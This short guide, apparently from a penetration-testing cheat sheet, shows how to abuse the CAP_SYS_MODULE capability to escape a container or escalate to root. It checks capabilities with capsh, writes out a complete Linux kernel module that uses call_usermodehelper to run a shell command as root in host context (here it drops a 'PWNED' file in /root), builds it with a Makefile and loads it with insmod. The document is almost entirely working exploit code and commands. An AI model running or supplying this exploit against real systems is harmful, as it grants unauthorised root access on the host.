# Kernel Escalation

### 1) Confirm capability

Look for CAP_SYS_MODULE in the Bounding Set.

    capsh --print

### 2) Write the malicious module

    cat > escape.c << 'CEOF'
    #include <linux/module.h>
    #include <linux/kernel.h>
    #include <linux/kmod.h>
    
    static char *argv[] = { "/bin/sh", "-c",
        "echo PWNED > /root/pwned.txt", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    
    static int __init escape_init(void)
    {
        printk(KERN_INFO "escape: running host-context command\n");
        return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }
    
    static void __exit escape_exit(void)
    {
        printk(KERN_INFO "escape: unloaded\n");
    }
    
    module_init(escape_init);
    module_exit(escape_exit);
    MODULE_LICENSE("GPL");
    CEOF

### 3) Create the Makefile

    printf 'obj-m += escape.o\n\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n' > Makefile

### 4) Build and load the module

    make

Then

    insmod escape.ko

